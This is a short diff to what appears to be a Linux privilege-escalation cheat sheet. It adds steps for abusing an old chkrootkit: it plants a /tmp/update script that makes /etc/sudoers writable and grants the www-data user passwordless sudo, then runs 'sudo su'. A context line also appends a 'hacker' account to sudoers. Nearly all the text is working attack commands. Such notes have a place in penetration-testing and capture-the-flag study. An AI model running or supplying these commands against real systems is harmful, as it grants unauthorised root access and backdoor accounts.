@@ -218,6 +218,15 @@ python linprivchecker.py extended
 
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
+### check which version of chkrootkit
+```
+dpkg -l | grep chkrootkit
+
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+```
+wait some time and keep checking the file size of sudoers
+
+then sudo su
 
 ### Basic info
 
